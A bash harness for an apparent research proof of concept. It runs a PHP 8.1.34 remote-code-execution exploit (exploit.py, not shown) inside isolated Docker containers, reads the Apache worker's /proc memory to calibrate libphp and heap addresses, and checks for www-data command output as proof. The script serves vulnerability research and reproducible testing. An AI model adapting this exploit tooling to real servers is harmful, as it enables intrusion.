#!/usr/bin/env bash
# Research-use only: fixed PHP 8.1.34 proof in a local Docker isolation lab.
set -Eeuo pipefail

if (( $# != 0 )); then
    echo "this runner accepts no arguments or external targets" >&2
    exit 64
fi
if [[ "$(uname -s)" != Linux ]]; then
    echo "run this script inside Linux or WSL" >&2
    exit 1
fi
if (( EUID != 0 )); then
    echo "local /proc calibration requires root; rerun with sudo" >&2
    exit 1
fi

readonly TARGET_IMAGE="mirror.gcr.io/library/php@sha256:72f0c0134922985022d55a39b0390d35dc7a10e961aa6c44fa35b4c3102f4268"
readonly TARGET_IMAGE_ID="sha256:e6c924c6e862e6c74e01be964f88cb0c7ccbd673925e9a648cbbf77ff53b7ca1"
readonly ATTACKER_IMAGE="python@sha256:a0f57064cbdcd6285fa45f51237ab0b35ea8ebaed06a1f5973e89e19dfb86704"
readonly ATTACKER_IMAGE_ID="sha256:a33c10a97f11005523814c6eee013986119fe41f3122f444518117536675c8e1"
readonly ALLOC_GLOBALS_OFFSET=0xf12c18
readonly R0_OFFSET=0x74160

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_DIR
readonly RUN_ID="$(date -u +%Y%m%dT%H%M%SZ)-$$"
readonly ARTIFACT_DIR="$SCRIPT_DIR/artifacts/$RUN_ID"

for dependency in awk dd find grep od python3 seq sha256sum sort tr uname xargs; do
    command -v "$dependency" >/dev/null || {
        echo "missing dependency: $dependency" >&2
        exit 1
    }
done

if command -v docker >/dev/null; then
    DOCKER_BIN="$(command -v docker)"
elif [[ -x /snap/bin/docker ]]; then
    DOCKER_BIN=/snap/bin/docker
else
    echo "docker executable not found" >&2
    exit 1
fi
readonly DOCKER_BIN

if [[ -n "${DOCKER_CONTEXT:-}" ]]; then
    context_name="$DOCKER_CONTEXT"
    context_endpoint="$(
        "$DOCKER_BIN" context inspect "$context_name" \
            --format '{{.Endpoints.docker.Host}}' 2>/dev/null
    )" || {
        echo "cannot inspect Docker context: $context_name" >&2
        exit 1
    }
    # Docker gives DOCKER_CONTEXT precedence over DOCKER_HOST.
    effective_endpoint="$context_endpoint"
else
    context_name="$("$DOCKER_BIN" context show)"
    context_endpoint="$(
        "$DOCKER_BIN" context inspect "$context_name" \
            --format '{{.Endpoints.docker.Host}}' 2>/dev/null
    )" || {
        echo "cannot inspect Docker context: $context_name" >&2
        exit 1
    }
    effective_endpoint="${DOCKER_HOST:-$context_endpoint}"
fi
case "$effective_endpoint" in
    unix://*) ;;
    *)
        echo "refusing non-Unix Docker endpoint: $effective_endpoint" >&2
        exit 1
        ;;
esac
if ! "$DOCKER_BIN" info >/dev/null 2>&1 && [[ "$DOCKER_BIN" == /snap/bin/docker ]] && command -v snap >/dev/null; then
    snap start docker >/dev/null
    for _ in $(seq 1 20); do
        "$DOCKER_BIN" info >/dev/null 2>&1 && break
        sleep 0.5
    done
fi
"$DOCKER_BIN" info >/dev/null 2>&1 || {
    echo "cannot access the local Docker daemon" >&2
    exit 1
}
docker_socket="${effective_endpoint#unix://}"
[[ -S "$docker_socket" ]] || {
    echo "local Docker socket is unavailable: $docker_socket" >&2
    exit 1
}

mkdir --parents -- "$ARTIFACT_DIR"
suffix="${RUN_ID//[^A-Za-z0-9_.-]/-}-${RANDOM}"
network_name="p2s-legacy81-net-$suffix"
volume_name="p2s-legacy81-out-$suffix"
target_name="p2s-legacy81-target-$suffix"
attacker_name="p2s-legacy81-attacker-$suffix"
network_created=0
volume_created=0
target_created=0
attacker_created=0

cleanup() {
    local rc=$?
    trap - EXIT INT TERM
    set +e
    local cleanup_failed=0
    : >"$ARTIFACT_DIR/cleanup.txt"
    if (( attacker_created )); then
        if "$DOCKER_BIN" rm -f "$attacker_name" >>"$ARTIFACT_DIR/cleanup.txt" 2>&1; then
            printf 'removed_container=%s\n' "$attacker_name" >>"$ARTIFACT_DIR/cleanup.txt"
        else
            cleanup_failed=1
        fi
    fi
    if (( target_created )); then
        if "$DOCKER_BIN" rm -f "$target_name" >>"$ARTIFACT_DIR/cleanup.txt" 2>&1; then
            printf 'removed_container=%s\n' "$target_name" >>"$ARTIFACT_DIR/cleanup.txt"
        else
            cleanup_failed=1
        fi
    fi
    if (( network_created )); then
        if "$DOCKER_BIN" network rm "$network_name" >>"$ARTIFACT_DIR/cleanup.txt" 2>&1; then
            printf 'removed_network=%s\n' "$network_name" >>"$ARTIFACT_DIR/cleanup.txt"
        else
            cleanup_failed=1
        fi
    fi
    if (( volume_created )); then
        if "$DOCKER_BIN" volume rm "$volume_name" >>"$ARTIFACT_DIR/cleanup.txt" 2>&1; then
            printf 'removed_volume=%s\n' "$volume_name" >>"$ARTIFACT_DIR/cleanup.txt"
        else
            cleanup_failed=1
        fi
    fi
    if ! (
        cd "$ARTIFACT_DIR" || exit 1
        find . -maxdepth 1 -type f ! -name SHA256SUMS.txt -print0 \
            | sort -z | xargs -0 sha256sum >SHA256SUMS.txt
        sha256sum --check SHA256SUMS.txt >/dev/null
    ); then
        cleanup_failed=1
    fi
    if (( cleanup_failed )) && (( rc == 0 )); then
        rc=1
    fi
    exit "$rc"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

ensure_image() {
    local reference=$1 expected_id=${2:-}
    if ! "$DOCKER_BIN" image inspect "$reference" >/dev/null 2>&1; then
        "$DOCKER_BIN" pull --quiet --platform linux/amd64 "$reference" >/dev/null
    fi
    local image_id os architecture repo_digests
    image_id="$("$DOCKER_BIN" image inspect "$reference" --format '{{.Id}}')"
    os="$("$DOCKER_BIN" image inspect "$reference" --format '{{.Os}}')"
    architecture="$("$DOCKER_BIN" image inspect "$reference" --format '{{.Architecture}}')"
    repo_digests="$("$DOCKER_BIN" image inspect "$reference" --format '{{json .RepoDigests}}')"
    [[ "$os" == linux && "$architecture" == amd64 ]] || {
        echo "refusing non-linux/amd64 image: $reference" >&2
        return 1
    }
    grep -Fq -- "$reference" <<<"$repo_digests" || {
        echo "pinned repository digest is absent: $reference" >&2
        return 1
    }
    if [[ -n "$expected_id" && "$image_id" != "$expected_id" ]]; then
        echo "image ID mismatch: $image_id != $expected_id" >&2
        return 1
    fi
    printf '%s\n' "$image_id"
}

actual_target_id="$(ensure_image "$TARGET_IMAGE" "$TARGET_IMAGE_ID")"
actual_attacker_id="$(ensure_image "$ATTACKER_IMAGE" "$ATTACKER_IMAGE_ID")"
"$DOCKER_BIN" image inspect "$TARGET_IMAGE" >"$ARTIFACT_DIR/target-image-inspect.json"
"$DOCKER_BIN" image inspect "$ATTACKER_IMAGE" >"$ARTIFACT_DIR/attacker-image-inspect.json"

"$DOCKER_BIN" network create --internal "$network_name" >/dev/null
network_created=1
"$DOCKER_BIN" network inspect "$network_name" >"$ARTIFACT_DIR/network-inspect.json"
[[ "$("$DOCKER_BIN" network inspect "$network_name" --format '{{.Internal}}')" == true ]]
[[ "$("$DOCKER_BIN" network inspect "$network_name" --format '{{.Scope}}')" == local ]]
[[ "$("$DOCKER_BIN" network inspect "$network_name" --format '{{.Ingress}}')" == false ]]
"$DOCKER_BIN" volume create "$volume_name" >/dev/null
volume_created=1

"$DOCKER_BIN" run --detach \
    --name "$target_name" \
    --hostname legacy81-target \
    --network "$network_name" \
    --network-alias legacy81-target \
    --init \
    --restart no \
    --security-opt no-new-privileges \
    --mount "type=bind,src=$SCRIPT_DIR/lab/index.php,dst=/var/www/html/index.php,readonly" \
    --mount "type=bind,src=$SCRIPT_DIR/lab/runtime.php,dst=/var/www/html/runtime.php,readonly" \
    --mount "type=bind,src=$SCRIPT_DIR/lab/php.ini,dst=/usr/local/etc/php/conf.d/zz-legacy-lab.ini,readonly" \
    --mount "type=bind,src=$SCRIPT_DIR/lab/apache.conf,dst=/etc/apache2/conf-enabled/zz-legacy-lab.conf,readonly" \
    --mount "type=volume,src=$volume_name,dst=/out" \
    "$TARGET_IMAGE" >/dev/null
target_created=1

for _ in $(seq 1 40); do
    if [[ "$("$DOCKER_BIN" inspect "$target_name" --format '{{.State.Running}}')" == true ]] && \
       "$DOCKER_BIN" exec "$target_name" php -r 'exit(PHP_VERSION === "8.1.34" ? 0 : 1);' >/dev/null 2>&1; then
        break
    fi
    sleep 0.25
done

"$DOCKER_BIN" inspect "$target_name" >"$ARTIFACT_DIR/target-container-inspect.json"
[[ "$("$DOCKER_BIN" inspect "$target_name" --format '{{.Image}}')" == "$TARGET_IMAGE_ID" ]]
[[ "$("$DOCKER_BIN" inspect "$target_name" --format '{{.HostConfig.NetworkMode}}')" == "$network_name" ]]
[[ "$("$DOCKER_BIN" inspect "$target_name" --format '{{json .HostConfig.PortBindings}}')" == '{}' ]]
[[ "$("$DOCKER_BIN" inspect "$target_name" --format '{{range .Mounts}}{{if eq .Destination "/out"}}{{.Name}}|{{.RW}}{{end}}{{end}}')" == "$volume_name|true" ]]
[[ "$("$DOCKER_BIN" exec "$target_name" php -r 'echo PHP_VERSION;')" == 8.1.34 ]]
[[ "$("$DOCKER_BIN" exec "$target_name" php -r 'echo ini_get("memory_limit");')" == 8M ]]
"$DOCKER_BIN" exec "$target_name" sh -eu -c \
    'rm -f /out/p; chmod 0733 /out; test ! -e /out/p'
runtime_observed="$(
    "$DOCKER_BIN" run --rm \
        --network "$network_name" \
        --read-only \
        --tmpfs /tmp:rw,nosuid,nodev,noexec,size=8m \
        --cap-drop ALL \
        --security-opt no-new-privileges \
        --user 65534:65534 \
        "$ATTACKER_IMAGE" \
        python3 -c 'import urllib.request; print(urllib.request.urlopen("http://legacy81-target/runtime.php", timeout=10).read().decode())'
)"
[[ "$runtime_observed" == '8.1.34|apache2handler|8M' ]] || {
    echo "unexpected HTTP runtime identity: $runtime_observed" >&2
    exit 1
}

"$DOCKER_BIN" top "$target_name" -eo pid,user,comm >"$ARTIFACT_DIR/docker-top.txt"
mapfile -t worker_pids < <(
    awk '$3 == "apache2" && $2 != "root" {print $1}' \
        "$ARTIFACT_DIR/docker-top.txt"
)
(( ${#worker_pids[@]} == 1 )) || {
    echo "expected exactly one non-root Apache worker; got ${#worker_pids[@]}" >&2
    exit 1
}
worker_pid="${worker_pids[0]}"
[[ "$worker_pid" =~ ^[0-9]+$ && -r "/proc/$worker_pid/maps" ]] || {
    echo "cannot identify the single Apache worker" >&2
    exit 1
}

libphp_base="$(
    awk '/libphp[.]so/ && $3 == "00000000" {split($1, range, "-"); print "0x" range[1]; exit}' \
        "/proc/$worker_pid/maps"
)"
[[ "$libphp_base" =~ ^0x7[0-9a-f]+000$ ]] || {
    echo "cannot calibrate the local libphp base" >&2
    exit 1
}
alloc_globals_address=$((libphp_base + ALLOC_GLOBALS_OFFSET))
heap_pointer="$(
    dd if="/proc/$worker_pid/mem" bs=1 skip="$alloc_globals_address" count=8 status=none |
        od -An -tu8 | tr -d ' \n'
)"
[[ "$heap_pointer" =~ ^[0-9]+$ ]] || {
    echo "cannot read the local Zend MM heap pointer" >&2
    exit 1
}
chunk_base=$((heap_pointer & ~0x1fffff))
(( chunk_base >= 0x700000000000 && chunk_base < 0x800000000000 && (chunk_base & 0x1fffff) == 0 )) || {
    echo "local Zend MM chunk calibration is implausible" >&2
    exit 1
}

{
    printf 'PROFILE=php-8.1.34-apache-amd64-proc-calibrated\n'
    printf 'TARGET_IMAGE=%s\n' "$TARGET_IMAGE"
    printf 'TARGET_IMAGE_ID=%s\n' "$actual_target_id"
    printf 'ATTACKER_IMAGE=%s\n' "$ATTACKER_IMAGE"
    printf 'ATTACKER_IMAGE_ID=%s\n' "$actual_attacker_id"
    printf 'HTTP_RUNTIME=%s\n' "$runtime_observed"
    printf 'NETWORK_INTERNAL=true\nPORT_BINDINGS={}\n'
    printf 'CALIBRATION_SOURCE=local-/proc\n'
    printf 'LIBPHP_BASE=%s\nCHUNK_BASE=0x%x\nR0_OFFSET=0x%x\n' \
        "$libphp_base" "$chunk_base" "$R0_OFFSET"
} | tee "$ARTIFACT_DIR/run-metadata.txt"

"$DOCKER_BIN" create \
    --name "$attacker_name" \
    --network "$network_name" \
    --read-only \
    --tmpfs /tmp:rw,nosuid,nodev,noexec,size=16m \
    --cap-drop ALL \
    --security-opt no-new-privileges \
    --user 65534:65534 \
    --env PYTHONDONTWRITEBYTECODE=1 \
    --env "PHP2SHELL_LIBPHP_BASE=$libphp_base" \
    --env "PHP2SHELL_CHUNK_BASE=0x$(printf '%x' "$chunk_base")" \
    --mount "type=bind,src=$SCRIPT_DIR/exploit.py,dst=/lab/exploit.py,readonly" \
    "$ATTACKER_IMAGE" python3 /lab/exploit.py >"$ARTIFACT_DIR/attacker-container-id.txt"
attacker_created=1
"$DOCKER_BIN" inspect "$attacker_name" >"$ARTIFACT_DIR/attacker-container-inspect.json"
[[ "$("$DOCKER_BIN" inspect "$attacker_name" --format '{{.Image}}')" == "$ATTACKER_IMAGE_ID" ]]
[[ "$("$DOCKER_BIN" inspect "$attacker_name" --format '{{.Config.User}}')" == '65534:65534' ]]
[[ "$("$DOCKER_BIN" inspect "$attacker_name" --format '{{.HostConfig.NetworkMode}}')" == "$network_name" ]]
[[ "$("$DOCKER_BIN" inspect "$attacker_name" --format '{{.HostConfig.ReadonlyRootfs}}')" == true ]]
[[ "$("$DOCKER_BIN" inspect "$attacker_name" --format '{{json .HostConfig.CapDrop}}')" == '["ALL"]' ]]
[[ "$("$DOCKER_BIN" inspect "$attacker_name" --format '{{json .HostConfig.PortBindings}}')" == '{}' ]]
grep -Fq 'no-new-privileges' <<<"$("$DOCKER_BIN" inspect "$attacker_name" --format '{{json .HostConfig.SecurityOpt}}')"
"$DOCKER_BIN" start --attach "$attacker_name" | tee "$ARTIFACT_DIR/exploit-output.txt"
"$DOCKER_BIN" inspect "$attacker_name" >"$ARTIFACT_DIR/attacker-container-final-inspect.json"

sleep 1
proof="$("$DOCKER_BIN" exec "$target_name" sh -c 'cat /out/p 2>/dev/null || true')"
if [[ ! "$proof" =~ ^uid=33\(www-data\) ]]; then
    "$DOCKER_BIN" logs "$target_name" >"$ARTIFACT_DIR/target.log" 2>&1 || true
    echo "RCE_PROOF_MISSING" | tee "$ARTIFACT_DIR/result.txt" >&2
    exit 1
fi
printf '%s\n' "$proof" | tee "$ARTIFACT_DIR/proof.txt"
printf 'RCE_PROOF_PRESENT\n' | tee "$ARTIFACT_DIR/result.txt"
"$DOCKER_BIN" logs "$target_name" >"$ARTIFACT_DIR/target.log" 2>&1 || true

(
    cd "$SCRIPT_DIR"
    sha256sum \
        README.md exploit.py run-local-docker-lab.sh \
        lab/apache.conf lab/index.php lab/php.ini lab/runtime.php \
        >"$ARTIFACT_DIR/SOURCE_SHA256SUMS.txt"
)
printf 'ARTIFACTS=%s\n' "$ARTIFACT_DIR"
